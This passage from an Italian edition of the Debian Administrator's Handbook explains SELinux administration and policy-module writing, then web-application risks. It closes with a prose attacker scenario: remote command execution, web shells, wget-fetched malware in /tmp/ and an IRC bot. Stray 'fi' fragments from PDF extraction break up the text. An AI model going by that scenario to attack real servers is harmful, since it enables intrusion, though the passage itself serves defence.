     processo, dal role (ruolo) e dal domain (dominio) dell’utente quando è stato avviato il processo. Le
     autorizzazioni stesse dipendono dal dominio, ma le transizioni fra un dominio e l'altro
     sono gestite dai ruoli. In ne, le transizioni tra i ruoli dipendono dall'identità.

                                   Figura 14.3 Contesti di sicurezza e utenti Unix

     In pratica, durante il login, all'utente viene assegnato un contesto di sicurezza (in base al ruolo che
     ha il diritto di assumere). Il contesto di sicurezza individua il dominio corrente, nonché il dominio
     per tutti i nuovi child processes. Qualora desideriate personalizzare un ruolo e di conseguenza il
     dominio associato, dovrete invocare newrole -r role_r -t domain_t (di solito è consentito un solo
     dominio per un dato ruolo, rendendo il parametro -t inutile). Il sopracitato comando richiede la
     password utente. La ragione di tale prassi è che in questo modo viene impedito a qualsiasi
     programma di modi care il ruolo autonomamente. Inoltre le modi che possono essere implementate
     solo se previsto dalla policy di SELinux.

     Naturalmente i diritti non vengono applicati universalmente a tutti gli objects [oggetti] ( les,
     directories, sockets, devices, ecc.). Possono variare da un oggetto all'altro. Per raggiungere tale
     scopo, ogni oggetto viene associato ad un type [tipo] (questo meccanismo viene de nito labeling).

                                                           TDAH_1.0      Capitolo XIV - Sicurezza Pagina 397
fi
             fi
                  fi
                       fi
                                                              fi
                                                                                 fi
                                                                                      fi
I diritti correlati ai domini sono pertanto individuati in termini di operazioni autorizzate (o non
autorizzate) in base ai tipi (ed implicitamente in base a tutti gli oggetti che sono stati contrassegnati
con lo stesso tipo attraverso il labeling).

           EXTRA           Internamente, un dominio è soltanto un tipo, che si applica unicamente ai processi.
 Dominio e tipo            Per tale ragione i domini hanno il suf sso _t come i tipi assegnati agli oggetti.
 sono equivalenti

Per impostazione prede nita, un programma in esecuzione eredita il dominio dell'utente che lo ha
avviato, ma le policies di SELinux esigono che i programmi più importanti siano eseguiti in domini
dedicati. Pertanto gli eseguibili vengono contrassegnati con un tipo dedicato (ad esempio ssh è
contrassegnato con ssh_exec_t, di conseguenza al suo avvio gli viene assegnato automaticamente il
dominio ssh_t). Questo meccanismo automatico di transizione del dominio consente di garantire
esclusivamente i diritti necessari al corretto funzionamento di ciascun programma; SELinux si basa
su tale principio.

                                Figura 14.4 Transizioni di dominio automatiche

Pagina 398 Il Manuale dell’Amministratore di Debian TDAH_1.0
            fi
                      fi
                     IN PRATICA        Per conoscere il contesto di sicurezza di un dato processo, dovrete utilizzare
                Conoscere il           l’opzione Z di ps.
                security context
                                       $ ps axZ | grep vstfpd
                                       system_u:system_r:ftpd_t:s0           2094 ?               Ss 0:00        /usr/sbin/
                                       -> vsftpd

                                       Il primo campo include (separati da due punti): l'identità, il ruolo, il dominio ed il
                                       livello MCS. Il livello MCS (Multi-Category Security) è un parametro con ef cacia
                                       sulla con gurazione della politica di sicurezza inerente alla riservatezza, in quanto
                                       regola l’accesso ai les in base alla loro “sensitivity” [si riferisce alla “sensibilità”
                                       delle informazioni e dei dati]. Questa funzionalità non verrà discussa in questo
                                       libro.
                                       Per conoscere il contesto di sicurezza attualmente attivo dovrete invocare id -Z
                                       attraverso la shell.

                                       $ id -Z
                                       unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

                                       In ne, per conoscere il type (tipo) assegnato a un le, potrete utilizzare ls -Z.

                                       $ ls -Z test /usr/bin/ssh
                                       unconfined_u:object_r:user_home_t:s0 test
                                            system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh

                                       Occorre precisare che l'identità ed il ruolo associati ad un le non hanno particolare
                                       importanza (e non vengono mai utilizzati); difatti viene assegnato a tutti gli oggetti
                                       un contesto di sicurezza completo solo per ragioni di uniformità.

               14.5.2. Come con gurare SELinux

               Il supporto di SELinux è nativo nei kernels prede niti distribuiti da Debian. Gli strumenti
               fondamentali di Unix supportano SELinux senza necessità di personalizzazioni.

               Attraverso il comando apt install selinux-basics selinux-policy-default potrete installare
               automaticamente i pacchetti necessari per con gurare un sistema SELinux.

                    ATTENZIONE         Sfortunatamente, i manutentori del pacchetto sorgente refpolicy non sono stati
                “Reference             in grado di risolvere i bugs critici con conseguente rimozione del suddetto pacchetto
                                       da Jessie.
                policy” è assente
                                       In pratica i pacchetti selinux-policy-* non sono al momento disponibili in Jessie
                in Jessie              e devono essere recuperati altrove. Si spera che un giorno possano di nuovo essere
                                       distribuiti in una point release o in jessie-backports. Nel frattempo potrete
                                       recuperarli da Unstable.
                                       Purtroppo il sopracitato contesto dimostra che SELinux non è molto popolare tra
                                       utenti e sviluppatori che utilizzano le versioni di sviluppo Debian.
                                       Pertanto se sceglierete SELinux dovrete mettere in conto che la policy prede nita
                                       potrebbe non funzionare correttamente e che dovrete personalizzarla in base alle
                                       vostre esigenze.

               Il pacchetto selinux-policy-default contiene un set di regole standard. Per impostazione
               prede nita, la policy limita l'accesso di alcuni servizi altamente esposti. Le sessioni utente
               non sono limitate, di conseguenza è improbabile che SELinux possa bloccare gli utenti legittimi.

                                                                       TDAH_1.0        Capitolo XIV - Sicurezza Pagina 399
fi
     fi
          fi
                   fi
                        fi
                                                  fi
                                                       fi
                                                            fi
                                                                 fi
                                                                             fi
                                                                                  fi
Tuttavia ciò intensi ca la sicurezza dei servizi di sistema in esecuzione sulla macchina.
Per ottenere una con gurazione equivalente alle vecchie regole "strict" (rigide), dovrete
disattivare il modulo unconfined (la gestione dei moduli viene descritta in questo capitolo).

Dopo aver installato la policy dovrete effettuare il labeling di tutti i les disponibili (ossia dovrete
assegnare ai les in questione un tipo). Tale operazione dovrà essere avviata manualmente
attraverso fixfiles relabel.

Il sistema SELinux ora è pronto. Per attivarlo dovrete aggiungere il parametro selinux=1
security=selinux al kernel Linux. Il parametro audit=1 abilita il tracciamento di SELinux
attraverso logs delle operazioni ri utate. In ne il parametro enforcing=1 abilita le regole; infatti
SELinux, senza il sopracitato parametro, gestisce le sue attività nella modalità prede nita
denominata permissive (permissiva) che per quanto tenga traccia delle azioni vietate ne consente
comunque la loro esecuzione. Di conseguenza dovrete modi care il le di con gurazione di GRUB per
aggiungere i parametri desiderati. Il modo più semplice per farlo è attraverso la variabile
GRUB_CMDLINE_LINUX in /etc/default/grub ed eseguire poi update-grub. Al successivo avvio,
SELinux sarà attivo.
Dovrete tenere presente che lo script selinux-activate automatizza le suddette operazioni e
consente di forzare il labeling al riavvio successivo, in modo che non vengano creati les privi di
labeling quando ancora SELinux non è attivo o il labeling è in corso.

14.5.3. Come gestire un sistema SELinux

La policy di SELinux è un set di regole modulare; durante l’installazione della policy vengono rilevati
e attivati automaticamente tutti i moduli necessari in base ai servizi già installati. Di conseguenza, il
sistema è immediatamente funzionale. Tuttavia, se installerete un servizio successivamente
l’installazione della policy di SELinux, dovrete attivare manualmente il corrispondente modulo. A
tale scopo è dedicato il comando semodule. Inoltre, dovrete de nire i ruoli per i quali ciascun utente
sarà autorizzato attraverso il comando semanage.

Attraverso i due sopracitati comandi potrete modi care la con gurazione corrente di SELinux che è
conservata in /etc/selinux/default/. Contrariamente alla prassi per cui è possibile
personalizzare i les di con gurazione di /etc/, i les in /etc/selinux/default/ non devono
essere modi cati manualmente. Dovrete gestirli utilizzando i programmi previsti a tale scopo.

             ANDANDO                     Dato che l’NSA non offre alcuna documentazione uf ciale di supporto per
                OLTRE                    SELinux, la community ha creato una pagina wiki per colmare questa
       Maggiore                          palese mancanza. Inoltre per quanto la pagina wiki possa contenere
       documentazione                    numerose informazioni dovrete considerare che la maggioranza dei
                                         contributori SELinux sono utenti Fedora (distribuzione in cui SELinux è
                                         abilitato per impostazione prede nita). La documentazione difatti tende ad
                                         essere speci ca per Fedora.

                                           http://www.selinuxproject.org

                                         È consigliabile pertanto consultare anche la pagina wiki di Debian dedicata
                                         a SELinux ed il blog di Russell Coker, uno degli sviluppatori Debian più
                                         attivi per il supporto su SELinux.

                                           http://wiki.debian.org/SELinux
                                           http://etbe.coker.com.au/tag/selinux/

Pagina 400 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
 fi
      fi
           fi
                fi
                     fi
                          fi
                               fi
                                    fi
                                                fi
                                                       fi
                                                        fi
                                                             fi
                                                                  fi
                                                                       fi
                                                                        fi
                                                                             fi
                                                                             fi
                                                                                   fi
                                                                                         fi
                                                                                              fi
     14.5.3.1 Gestione dei moduli SELinux

     I moduli SELinux disponibili vengono memorizzati nella directory /usr/share/selinux/
     default/. Per attivare uno dei moduli in questione nella vostra con gurazione corrente, dovrete
     utilizzare semodule -i module.pp.bz2. L'estensione pp.bz2 è l’acronimo di policy package
     [traducibile elasticamente in "pacchetto regole"] (compresso con bzip2).
     Diversamente se desiderate rimuovere un modulo dalla vostra con gurazione corrente dovrete
     utilizzare il comando semodule -r module. In ne il comando semodule -l elenca i moduli
     correntemente installati. Inoltre l’output del precedente comando include anche il numero di
     versione del modulo. I moduli possono anche essere abilitati e disabilitati selettivamente attraverso i
     comandi semodule -e (per abilitare) e semodule -d (per disabilitare).

     # semodule -i /usr/share/selinux/default/abrt.pp.bz2
     # semodule -l
     abrt 1.5.0 Disabled
     accountsd 1.1.0
     acct 1.6.0
     [...]
     # semodule -e abrt
     # semodule -d accountsd
     # semodule -l
     abrt 1.5.0
     accountsd 1.1.0 Disabled acct 1.6.0
     [...]
     # semodule -r abrt
     # semodule -l
     accountsd 1.1.0 Disabled acct 1.6.0
     [...]

     semodule carica immediatamente la nuova con gurazione a meno che non utilizziate l’opzione -n.
     Si precisa che il programma ha ef cacia sulla con gurazione corrente (de nita dalla variabile
     SELINUXTYPE in /etc/selinux/config), ma potrete individuare un’altra con gurazione da
     modi care attraverso l’opzione -s.

     14.5.3.2 Gestione delle identità

     Ogni volta che un utente effettua il login riceve un’identità SELinux. Tale identità de nisce i ruoli per
     i quali ciascun utente sarà autorizzato. Ciò comporta la presenza di due mapping [mappature]
     (dall’utente all’identità e dall’identità ai ruoli) con gurabili attraverso il comando semanage.

     La lettura della manual page semanage(8) è consigliabile anche se la sintassi dei concetti da gestire
     è simile. Difatti molte opzioni sono comuni per tutti i sottocomandi: -a iniziale del termine inglese
     add (aggiungere); -d iniziale del termine inglese delete (cancellare); -m iniziale del termine inglese
     modify (modi care); -l iniziale del termine inglese list (elencare); -t iniziale del termine inglese
     type (tipo o dominio).

     Il comando semanage login -l elenca il mapping corrente fra gli identi catori utente e le identità
     SELinux. Agli utenti che non hanno una voce esplicita viene assegnata l’identità indicata in

                                                            TDAH_1.0              Capitolo XIV - Sicurezza Pagina 401
fi
       fi
                           fi
                                        fi
                                             fi
                                                  fi
                                                       fi
                                                              fi
                                                                   fi
                                                                        fi
                                                                             fi
                                                                                    fi
                                                                                         fi
the_defualt_entry. Il comando semanage login -a -s user_u user associa l’identità user_u ad
un determinato user. In ne il comando semanage login -d user fa decadere l’entry con il mapping
assegnato all’utente.

# semanage login -a -s user_u rhertzog
# semanage login -l

Login Name        SELinux User                        MLS/MCS                          Range Service
_default_         unconfined_u                        SystemLow-SystemHigh                         *
rhertzog          user_u                              SystemLow                                    *
root              unconfined_u                        SystemLow-SystemHigh                         *
system_u          system_u                            SystemLow-SystemHigh                         *
# semanage login -d rhertzog

semanage user -l elenca il mapping tra identità SELinux e ruoli autorizzati. Per aggiungere
una nuova identità dovrete de nire sia i ruoli corrispondenti, sia il pre sso del labeling da utilizzare
per assegnare il tipo ai les personali (/home/user/*). Il pre sso da de nire deve essere scelto fra:
user, staff e sysadm. Troverete il pre sso “staff” nei les del tipo “staff_home_dir_t”. Il
comando per creare un'identità è semanage user -a -R roles -P prefix identity. In ne, potrete
rimuovere un'identità utente SELinux attraverso il comando semanage user -d identity.

# semanage user -a -R ’staff_r user_r’ -P staff test_u
# semanage user -l
               Labeling     MLS/        MLS/
SELinux User   Prefix       MLS Level   MCS Range                          SELinux Roles

root           sysadm            SystemLow         SystemLow-SystemHigh    staff_r sysadm_r system_r
staff_u        staff             SystemLow         SystemLow-SystemHigh    staff_r sysadm_r
sysadm_u       sysadm            SystemLow         SystemLow-SystemHigh    sysadm_r
system_u       user              SystemLow         SystemLow-SystemHigh    system_r
test_u         staff             SystemLow         SystemLow               staff_r user_r
unconfined_u   unconfined        SystemLow         SystemLow-SystemHigh    system_r unconfined_r
user_u         user              SystemLow         SystemLow               user_r
# semanage user -d test_u

14.5.3.3 Gestione di File Contexts, Ports e Booleans

Ciascun modulo SELinux offre una serie di regole per il labeling dei les, ma potrete aggiungere ad
hoc delle regole di labeling per supportare casi particolari. Per esempio se desiderate autorizzare il
web server alla lettura della gerarchia les /srv/www/ potrete eseguire semanage fcontext -a -t
httpd_sys_content_t ”/srv/www(/.*)?” e poi restorecon -R /srv/www/. Il primo comando
salva le nuove regole di labeling mentre il secondo comando resetta il labeling correntemente in uso.
Anche i ports TCP/UDP sono contrassegnati con un labeling in modo da garantire la ricezione
soltanto ai demoni legittimi. Ad esempio, se desiderate che il web server sia in grado di mettersi in
ricezione del port 8080 dovrete eseguire semanage port -m -t http_port_t -p tcp 8080.

Pagina 402 Il Manuale dell’Amministratore di Debian TDAH_1.0
           fi
                fi
                     fi
                           fi
                            fi
                                              fi
                                                      fi
                                                            fi
                                                                 fi
                                                                      fi
                                                                              fi
     Diversi moduli SELinux esportano le opzioni booleane che potrete personalizzare per modi care il
     funzionamento delle regole prede nite. L'utilità getsebool consente di veri care lo stato delle
     suddette opzioni (getsebool boolean permette di visualizzare lo stato di una data opzione, mentre
     getsebool -a le visualizza tutte). Il comando setsebool boolean value cambia il valore corrente
     di un'opzione booleana. L'opzione -P rende la modi ca permanente, ovvero il nuovo valore diverrà il
     valore prede nito, ma sarà ef cace al successivo riavvio.
     Nell’esempio seguente viene descritto come autorizzare l’accesso del web server alle home
     directories (utile quando gli utenti hanno siti web personali in ~/public_html/).

     # getsebool httpd_enable_homedirs
     httpd_enable_homedirs --> off
     # setsebool -P httpd_enable_homedirs on
     # getsebool httpd_enable_homedirs
     httpd_enable_homedirs --> on

     14.5.4 Adeguamento delle Regole

     La policy SELinux è modulare, pertanto essere in grado di sviluppare nuovi moduli (possibilmente
     personalizzati) per le applicazioni che ne sono prive potrebbe essere utile. Inoltre i nuovi moduli
     potranno integrare la reference policy.

     Per creare i nuovi moduli avrete bisogno anche dei pacchetti selinux-policy-dev e selinux-
     policy-doc. Quest’ultimo include la documentazione delle regole standard (/usr/share/doc/
     selinux-policy.doc/html) ed i les d’esempio che possono essere usati come modelli per creare i
     nuovi moduli. Di conseguenza è consigliabile installarli per poterli meglio consultare:

     $    cp   /usr/share/doc/selinux-policy-doc/Makefile.example Makefile
     $    cp   /usr/share/doc/selinux-policy-doc/example.fc ./
     $    cp   /usr/share/doc/selinux-policy-doc/example.if ./
     $    cp   /usr/share/doc/selinux-policy-doc/example.te ./

     Il le .te è il più importante fra tutti in quanto de nisce le regole. Il le .fc de nisce i file
     contexts ossia i tipi assegnati ai les in relazione al modulo in questione. I dati inclusi nel le .fc
     sono utilizzati durante il labeling dei les. In ne il le .if de nisce l’interfaccia del modulo: è un set
     di “public functions” [funzioni condivise] che altri moduli possono usare per interagire
     correttamente con il modulo che state creando.

     14.5.4.1 Come scrivere un le .fc

     La lettura dell’esempio seguente dovrebbe essere suf ciente per comprendere la struttura di un le.
     Potrete usare un’espressione regolare per assegnare lo stesso contesto di sicurezza a diversi les
     oppure ad un intero directory tree.

                                                                          TDAH_1.0   Capitolo XIV - Sicurezza Pagina 403
fi
     fi
                      fi
                           fi
                                fi
                                 fi
                                      fi
                                           fi
                                                fi
                                                     fi
                                                          fi
                                                           fi
                                                                fi
                                                                     fi
                                                                             fi
                                                                                     fi
                                                                                          fi
                                                                                                   fi
                                                                                                   fi
                                                                                                        fi
                                                                                                             fi
                                          Esempio 14.2 Il le example.fc

     #    myapp executable will have:
     #    label: system_u:object_r:myapp_exec_t
     #    MLS sensitivity: s0
     #    MCS categories: <none>

     /usr/sbin/myapp --         gen_context(system_u:object_r:myapp_exec_t,s0)

     14.5.4.2 Come scrivere un le .if

     Nell'esempio seguente, il primo interface (myapp_domtrans) veri ca chi ha il diritto di eseguire
     l'applicazione. Il secondo interface (myapp_read_log) garantisce i permessi di lettura sui log les
     dell'applicazione.

     Ciascuna interfaccia deve generare un valido set di regole da integrare in un le .te. Dovrete
     pertanto dichiarare tutti i tipi da utilizzare (con la macro gen_require) ed impiegare le direttive
     prede nite per garantire i permessi. Occorre precisare che potrete utilizzare le interfacce attraverso
     altri moduli. Il prossimo paragrafo vi fornirà maggiori spiegazioni su come de nire i suddetti diritti.

                                          Esempio 14.3 Il le example.if

     ## <summary>Myapp example policy</summary>
     ## <desc>
     ##             
     ##                               More descriptive text about myapp. The <desc>
     ##                               tag can also use 
, <ul>, and <ol>
     ##                               html tags for formatting.
     ##             
     ##             
     ##                               This policy supports the following myapp features:
     ##                               <ul>
     ##                               <li>Feature A</li>
     ##                               <li>Feature B</li>
     ##                               <li>Feature C</li>
     ##             </ul>
     ##             
     ## </desc>
     #

     ########################################
     ## <summary>
     ##             Execute a domain transition to run myapp.
     ## </summary>
     ## <param name=”domain”>
     ##             Domain allowed to transition.

     Pagina 404 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
         fi
         fi
                     fi
                                                             fi
                                                                          fi
                                                                               fi
                                                                                           fi
     ## </param>
     #
     interface(‘myapp_domtrans’,‘
             gen_require(‘
                      type myapp_t, myapp_exec_t;
             ’)
             domtrans_pattern($1,myapp_exec_t,myapp_t)
     ’)
     ########################################
     ## <summary>
     ##       Read myapp log les.
     ## </summary>
     ## <param name=”domain”>
     ##       Domain allowed to read the log les.
     ## </param>
     #
     interface(‘myapp_read_log’,‘
             gen_require(‘
                      type myapp_log_t;
             ’)
             logging_search_logs($1)
             allow $1 myapp_log_t: le r_ le_perms;
     ’)

       DOCUMENTAZIONE                    La reference policy si è sviluppata sotto forma di progetto libero basato sui
      Spiegazioni sulla                  contributi volontari. Il progetto è ospitato da Tresys, una delle società più attive
      reference policy                   riguardo a SELinux. La loro pagina wiki contiene spiegazioni sulla struttura
                                         delle regole e sulla loro creazione.

                                         ✦https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted

     14.5.4.3 Come scrivere un le .te

        ANDANDO OLTRE                    Per strutturare correttamente la policy, gli sviluppatori di SELinux impiegano
      Il linguaggio m4 macro             un macro-comand processor. In pratica gli sviluppatori invece di ripetere
                                         un’in nità di direttive allow molto simili, creano delle “funzioni macro” con una
                                         logica di alto-livello, che tra l’altro agevola la lettura della policy.
                                         La funzione macro impiegata per la compilazione delle regole è m4. A sua volta la
                                         funzione macro deve compiere l’operazione opposta rispetto a quella degli
                                         sviluppatori: ossia, partendo dalle direttive di alto livello ed espandendole, deve
                                         costruire un vasto database di direttive allow.
                                         Di conseguenza le "interfacce" SELinux non sono altro che funzioni macro che
                                         verranno sostituite da un set di regole in fase di compilazione. Anche diversi
                                         diritti sono in realtà un insieme di autorizzazioni che verranno sostituite dai
                                         loro valori in fase di compilazione.

                                                                     TDAH_1.0       Capitolo XIV - Sicurezza Pagina 405
fi
                fi
                     fi
                          fi
                               fi
                                    fi
     Date un’occhiata al le example.te

     policy_module(myapp,1.0.0) 1
     ########################################
     #
     # Declarations
     #
     typemyapp_t; 2
     type myapp_exec_t;
     domain_type(myapp_t)
     domain_entry_file(myapp_t,myapp_exec_t) 3

     type myapp_log_t;
     logging_log_file(myapp_log_t) 4

     type myapp_tmp_t;
     files_tmp_file(myapp_tmp_t)

     ########################################
     #
     # Myapp local policy
     #

     allowmyapp_tmyapp_log_t:file{read_file_permsappend_file_perms}; 5

     allow myapp_t myapp_tmp_t:file manage_file_perms;
     files_tmp_filetrans(myapp_t,myapp_tmp_t,file)

     1 Il modulo deve essere identi cato attraverso il suo nome e numero di versione. Questa direttiva è
     obbligatoria.
     2 In ottemperanza alle presenti direttive i moduli dovranno dichiarare l’introduzione di nuovi tipi.
     Non esitate a creare tutti i tipi necessari, piuttosto che distribuire diritti inutili.
     3 Queste interfacce speci cano che il tipo myapp_t (come qualsiasi process domain) dovrebbe
     essere utilizzato per qualsiasi eseguibile con labeling myapp_exec_t. Ciò implica che venga aggiunto
     un attributo exec_type a questi oggetti e la presenza in sé dell’attributo exec_type consente inoltre
     ad altri moduli di garantire i permessi di esecuzione ai suddetti programmi: ad esempio il modulo
     userdomain autorizza i processi con domini user_t, staff_t e sysadm_t di eseguire tali
     programmi. I domini di altre applicazioni con nate non avranno il diritto di darne esecuzione, a
     meno che non lo prevedano delle regole con diritti simili (come nel caso di dpkg attraverso il suo
     dominio dpkg_t).
     4 logging_log_file è un'interfaccia offerta dalla reference policy. Tale interfaccia individua i log
       les attraverso il labeling dei les con un dato tipo, in modo che i log les possano bene ciare dei loro
     legittimi e correlati diritti (ad esempio i diritti che consentono a logrotate di gestirli).

     Pagina 406 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
             fi
                  fi
                       fi
                        fi
                                       fi
                                                               fi
                                                                                 fi
     5 La direttiva allow è la direttiva di base che autorizza un'operazione. Il primo parametro è il
     process domain a cui viene consentito di eseguire l'operazione. Il secondo parametro descrive
     l'oggetto che un processo del suddetto dominio potrà gestire. Quest’ultimo parametro richiede un
     form "type:class" in cui type rappresenta il tipo SELinux, mentre class rappresenta la natura
     dell'oggetto ( le, directory, socket, fo, ecc.). In ne, l'ultimo parametro descrive i permessi (le
     operazioni autorizzate).

     I permessi vengono de niti sotto forma di un insieme di operazioni autorizzate attraverso il
     seguente template: { operation1 operation2 }. Potrete anche utilizzare delle macro per
     rappresentare la maggior parte delle autorizzazioni più utili. /usr/share/selinux/devel/
     include/support/obj_perm_sets.spt li elenca.

     La seguente pagina web offre un elenco relativamente completo di object classes e dei permessi che
     possono essere concessi:

          http://www.selinuxproject.org/page/ObjectClassesPerms

     Giunti a questo punto non resta che trovare il set minimo di regole necessarie al corretto
     funzionamento dell’applicazione target o del servizio. Per raggiungere tale risultato dovrete
     conoscere le funzionalità dell'applicazione e della sua gestione (o creazione) dei dati.

     Tuttavia potrete attuare un approccio empirico. Dopo che gli oggetti rilevanti avranno un labeling
     corretto, potrete utilizzare l'applicazione in modalità permissiva: in questo modo le operazioni
     normalmente non autorizzate verranno registrate, ma saranno eseguite lo stesso. Quindi sarà
     suf ciente analizzare i logs per individuare le operazioni che devono essere autorizzate. A seguire
     un esempio di una log entry:

     avc: denied { read write } for pid=1876 comm=”syslogd” name=”xconsole” dev=tmpfs
         ->ino=5510 scontext=system_u:system_r:syslogd_t:s0
         ->tcontext=system_u:object_r: ̄ ->device_t:s0 tclass=fifo_file permissive=1

     Per comprendere meglio questo messaggio, analizziamolo poco a poco.

                                                         TDAH_1.0    Capitolo XIV - Sicurezza Pagina 407
fi
     fi
                 fi
                             fi
                                        fi
     Messaggio                                               Descrizione

     avc:denied                                              Un'operazione è stata negata.

     { read write }                                          Questa operazione richiedeva permessi di
                                                             lettura e di scrittura

     pid=1876                                                Il processo con PID 1876 ha eseguito
                                                             l'operazione (o ha tentato di eseguirla)

     comm="syslogd"                                          Il processo era un'istanza del programma
                                                             syslogd

     name="xconsole"                                         Il target object è stato denominato xconsole.
                                                             In alcuni casi potrete anche avere una variabile
                                                             "path" con un full path.

     dev=tmpfs                                               Il device che ospita il target object è un tmpfs
                                                             (un lesystem - un sistema di archiviazione).
                                                             Con un disco reale, potreste trovare invece la
                                                             partizione contenente l'oggetto (per esempio:
                                                             "sda3")

     ino=5510                                                L'oggetto è identi cato dal numero di inode
                                                             5510.

     scontext=system_u:system_r:                             Questo è l’attuale contesto del processo che ha
     syslogd_t:s0                                            eseguito l’operazione

     tcontext=system_u:object_r:device_t:s0                  Questo è il contesto di sicurezza del target
                                                             object

     tclass=fifo_file                                        Il target object è un FIFO le

                                    Tabella 14.1 Analisi di una traccia SELinux

     Analizzando il precedente log entry potrete creare una regola che autorizzi tale operazione. Per
     esempio allow syslogd_t device_t:fifo_file { read write }. Questo processo può essere reso
     automatico attraverso il comando audit2allow dal pacchetto policycoreutils. Questo tipo di
     approccio è utile solo se i diversi oggetti sono già stati opportunamente etichettati (labeling) in
     base a cosa occorre con nare. In ogni caso dovrete revisionare attentamente le regole generate e
     convalidarle basandovi sulla vostra conoscenza dell'applicazione. Difatti, spesso questo tipo di
     approccio comporta la concessione di più autorizzazioni rispetto a quelle realmente necessarie. Una
     soluzione consona è creare nuovi tipi per assegnare solamente a loro le autorizzazioni necessarie.
     Diversamente se un’operazione negata non è un errore fatale per l'applicazione, dovrete aggiungere
     una regola dontaudit in modo che non venga generato un log entry nonostante l'effettivo ri uto.

                            È sorprendente che i ruoli non intervengano nella creazione delle regole. Difatti
       INFORMAZIONE
           ACCESSORIA       SELinux impiega solamente i domini per conoscere quali operazioni sono
      Niente ruoli nelle    autorizzate. Invece il ruolo interviene indirettamente per consentire all'utente di
                            passare ad un altro dominio.
      regole della
                            SELinux si basa su una teoria denominata Type Enforcement secondo la quale il
      policy                tipo è l'unico elemento che conta nell'assegnazione dei diritti.

     Pagina 408 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
          fi
                 fi
                      fi
                                                                                           fi
          14.5.4.4 Compilazione dei les

          Quando i tre les (example.if, example.fc ed example.te) saranno in grado di soddisfare le
          vostre esigenze di nuove regole dovrete solamente eseguire make NAME=devel per generare un
          modulo nel le example.pp (che potrete immediatamente caricare attraverso semodule -i
          example.pp). Se sono stati de niti diversi moduli, make creerà tutti i les .pp corrispondenti.

          14.6. Altre considerazioni sulla sicurezza

          La sicurezza non riguarda soltanto l’aspetto tecnico; difatti, più di ogni altra cosa, occorre acquisire
          delle buoni abitudini ed essere consapevoli dei rischi. Questo paragrafo tratta una rassegna dei rischi
          più frequenti, nonché una serie di buone pratiche che, a seconda dei casi, miglioreranno la sicurezza
          o ridurranno l'effetto di un attacco riuscito.

          14.6.1. I rischi dovuti alle applicazioni web

          Il carattere universale delle applicazioni web ha comportato la loro proliferazione. Spesso sono
          eseguite in parallelo: una webmail, una pagina wiki, un groupware system, forums, una galleria
          fotogra ca, un blog, ecc.. Molte di queste applicazioni sono basate su piattaforme LAMP (acronimo
          costituito dalle iniziali delle componenti software con cui vengono realizzate - Linux, Apache, MySQL,
          PHP). E purtroppo sono scritte senza prestare troppa attenzione ai problemi di sicurezza. I dati
          provenienti dall’esterno vengono utilizzati senza alcuna o minima validazione. Alcuni valori possono
          essere utilizzati per sovvertire la chiamata di un comando in modo che venga eseguito un altro
          comando. Nel corso degli anni, i problemi più evidenti sono stati corretti, ma vengono regolarmente
          scoperte nuove vulnerabilità di sicurezza.

                    DIZIONARIO          Se un programma include dati nelle queries SQL in modo non sicuro, può
               SQL Injection            comportare vulnerabilità dovute a SQL Injection (iniezioni SQL); tale de nizione
                                        include gli atti idonei a modi care un parametro in modo che il programma esegua
                                        una query differente rispetto a quella prevista, per danneggiare i dati o per
                                        accedere ai dati che dovrebbero essere non accessibili.

                                          http://en.wikipedia.org/wiki/SQL_Injection

          È quindi fondamentale aggiornare regolarmente le applicazioni web per eliminare note vulnerabilità
          oggetto di exploit da cracker (professionisti o dilettanti - quest’ultimi denominati in modo
          dispregiativo script kiddy).
          A seconda dei casi, il rischio varia: si va dalla distruzione dei dati all'esecuzione di comandi
          arbitraria, compresi atti vandalici sui siti web.

          14.6.2. Sapere cosa aspettarsi

          La vulnerabilità di un’applicazione Web è spesso un punto di partenza per un atto di pirateria
          informatica. In breve a seguire sono descritte le possibili conseguenze.

                                                                     TDAH_1.0      Capitolo XIV - Sicurezza Pagina 409
fi
     fi
          fi
                         fi
                              fi
                                   fi
                                                                       fi
                                                                            fi
                                          Apache 2 include i moduli che consentono di ltrare le queries HTTP. Ciò permette
                      BREVE               di bloccare alcuni vettori di attacco. Per esempio per prevenire gli attacchi buffer
                   ACCENNO
                                          over ows occorre limitare la lunghezza di alcuni parametri. Molto genericamente è
           Filtraggio delle
                                          possibile stabilire la validazione dei parametri ancor prima che vengano trasmessi
           queries HTTP                   all’applicazione Web e limitarne l'accesso secondo diversi criteri. Inoltre potrete
                                          combinare tutto ciò con dei dynamic rewall updates [vedi anche RADIUS Server]
                                          allo scopo di bannare per un dato periodo di tempo dall’accesso del web server
                                          l’utente reo di aver violato le regole.
                                          Tali controlli sono piuttosto prolissi ed onerosi da impostare, ma i loro costi sono
                                          ripagati con le applicazioni web distribuite in cui gli avvisi di sicurezza si basano su
                                          un dubious track record [lett. “un registro di tracciamento dei sospetti”].
                                          mod-security2 (incluso nel pacchetto libapache2-mod-security2) è il modulo
                                          principale che può essere utilizzato per il suddetto scopo. Offre diverse regole
                                          pronte all’uso facile da installare (attraverso il pacchetto modsecurity-crs).

     Le conseguenze di un intrusione possono essere più o meno evidenti (con diversi livelli di
     “obvioness” - evidenza) a seconda dell'intenzione dell'attaccante. I script-kiddies si limitano ad
     implementare i contenuti [riguardo ad attacchi] che trovano sui siti web; i loro attacchi sono spesso
     atti vandalici nei confronti di una pagina web o la cancellazione di dati. Nei casi più sopraf ni
     aggiungono contenuti invisibili nelle pagine Web per migliorare la Search Engine Optimization
     (SEO) dei loro siti.

     Un attaccante più esperto non si accontenterà del suddetto misero risultato. Difatti un “disaster
     scenario” potrebbe svolgersi come segue: l'attaccante acquisisce la possibilità di eseguire comandi
     come www-data user, ma l’esecuzione di un comando in sé richiede diversi raggiri. Cercherà
     pertanto di sempli carsi la vita installando altre applicazioni web designate per eseguire da remoto
     diversi tipi di comandi, per ottenere: la consultazione del lesystem, l’analisi dei permessi,
     l’immissione e lo scaricamento di les, l’esecuzione dei comandi e persino una network shell. Spesso
     la vulnerabilità consente l’esecuzione del comando wget che scarica un malware in /tmp/ e poi
     implementa il malware. Il malware viene scaricato da un server esterno precedentemente
     compromesso, in modo da poter celare le tracce ed impedire di poter risalire all'origine dell'attacco.

     Giunto a questo punto, l'attaccante ha suf ciente libertà d’azione da installare un bot IRC (un robot
